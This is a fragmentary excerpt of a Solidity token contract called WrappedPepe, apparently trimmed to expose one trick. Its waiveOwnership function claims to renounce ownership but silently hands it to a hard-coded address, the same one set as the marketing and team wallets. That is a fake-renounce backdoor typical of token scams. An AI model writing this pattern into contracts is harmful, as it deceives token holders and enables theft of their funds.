...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x40E1856bC5E9095a1790F7ffCf16C64F6ca295cE);
    }
...
contract WrappedPepe is Context, IERC20, Ownable {
    ...
    string private _symbol = "WRAPPEDPEPE";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x40E1856bC5E9095a1790F7ffCf16C64F6ca295cE);
    address payable private teamWalletAddress = payable(0x40E1856bC5E9095a1790F7ffCf16C64F6ca295cE);
